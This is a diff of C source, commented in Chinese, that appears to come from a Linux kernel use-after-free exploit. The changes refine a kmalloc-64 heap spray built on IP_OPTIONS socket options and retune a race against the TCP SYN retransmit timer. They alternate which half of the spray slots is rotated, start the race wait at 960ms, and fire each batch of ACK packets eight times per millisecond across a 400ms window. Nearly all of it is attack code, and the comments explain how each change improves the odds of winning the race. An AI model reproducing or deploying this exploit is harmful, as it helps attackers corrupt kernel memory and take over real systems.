@@ -450,10 +450,21 @@ static void spray_recycle(uint32_t tag) {
         return;
     }
 
-    for (int i = 0; i < g_spray_n; i++) {
-        /* 清空 → 内核释放旧对象 */
+    /* 只轮换一半，另一半始终占着槽位；两轮分开做（先全放、再全补）。
+     *
+     * 全部释放再全部重建的话，每轮都有一段「192 个槽位同时空着」的时间，
+     * 而这正是我们最不想看到的 —— 内核那个 kfree 出来的洞如果落在这段
+     * 空档里，虽然紧接着会被填上，但距离释放已经隔了半轮，定时器那边
+     * 早读完了。留一半不动，kmalloc-64 里就始终有我们的对象，
+     * 被腾出来的那一半又足够给新分配提供落点。 */
+    int half = g_spray_n / 2;
+    /* 每轮交替轮换哪一半，保证两半都被动过。
+     * tag 的低 16 位是喷淋代数，用它的奇偶当开关。 */
+    int start = (tag & 0xffff) & 1 ? half : 0;
+    for (int i = start; i < start + half; i++) {
         setsockopt(g_spray[i], IPPROTO_IP, IP_OPTIONS, NULL, 0);
-        /* 立刻重设 → 内核分配新对象，很可能落在刚释放的那个槽位 */
+    }
+    for (int i = start; i < start + half; i++) {
         setsockopt(g_spray[i], IPPROTO_IP, IP_OPTIONS, opts, SPRAY_OPTLEN);
     }
 }
@@ -1483,8 +1494,13 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
      * 把「通道不通」和「通道通了但没撞上」分开，否则日志会误导。 */
     if (n == 0) return -1;
 
-    /* 等重传定时器就位。SYN 重传用 TCP_TIMEOUT_INIT，约 1 秒。 */
-    usleep(880 * 1000);
+    /* 等重传定时器就位。SYN 重传用 TCP_TIMEOUT_INIT，约 1 秒。
+     *
+     * 起点定在 960ms 而不是 880ms：TCP_TIMEOUT_INIT 在 6.6 上是
+     * TCP_TIMEOUT_INIT = 1s（HZ 无关），加上请求 sock 入队到定时器
+     * 真正挂上还有一点延迟，实际到期点通常在 1s 之后一点点。
+     * 从 960ms 起扫能把整个到期点包住，又不至于太早空转。 */
+    usleep(960 * 1000);
 
     /* 预先构造好每个四元组的 ACK 包，循环里只做 sendto，省掉打包开销。 */
     uint8_t acks[RACE_BATCH][128];
@@ -1494,9 +1510,21 @@ static int race_batch(struct race_slot *slots, int want, struct synack *out) {
                                slots[i].peer_seq + 1, 0x10);
     }
 
-    /* 每 1ms 给整批各补一个 ACK，持续 240ms，覆盖定时器到期窗口。 */
-    for (int round = 0; round < 240; round++) {
-        for (int i = 0; i < n; i++) tx(acks[i], ack_len[i]);
+    /* 从 960ms 扫到 1360ms，覆盖定时器到期窗口。
+     *
+     * 分两层：
+     *   外层每 1ms 一档，共 400 档 —— 负责覆盖整个 400ms 的不确定范围；
+     *   内层在每一档里把整批 ACK 连打 8 遍、不做任何等待 —— 负责在
+     *   这一毫秒内尽可能多次命中那个几十微秒的窗口。
+     *
+     * 之前是每 1ms 只打一次、或者每 200µs 打一次，都太稀：定时器到期
+     * 是个瞬间，稀稀拉拉地打，绝大多数 ACK 都落在窗口外。内层连打能让
+     * 「ACK 恰好落在定时器读内存的那一刻」的概率提高近一个数量级，
+     * 而代价只是多几次 sendto。 */
+    for (int round = 0; round < 400; round++) {
+        for (int k = 0; k < 8; k++) {
+            for (int i = 0; i < n; i++) tx(acks[i], ack_len[i]);
+        }
         usleep(1000);
     }
 
@@ -1651,7 +1679,7 @@ static int phase_race(struct hit_ctx *hit) {
         g_optlen, SPRAY_OPTLEN);
     {
         long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
-        say("[cpu] 在线核心 %ld 个；喷淋线程绑到最后一个核，主线程留在前面的核",
+        say("[cpu] 在线核心 %ld 个（未绑核，靠调度器分散）",
             ncpu > 0 ? ncpu : 1);
     }
     say("开始竞态：每批 %d 个四元组并行，最多 %d 批（每批等一次重传定时器）",
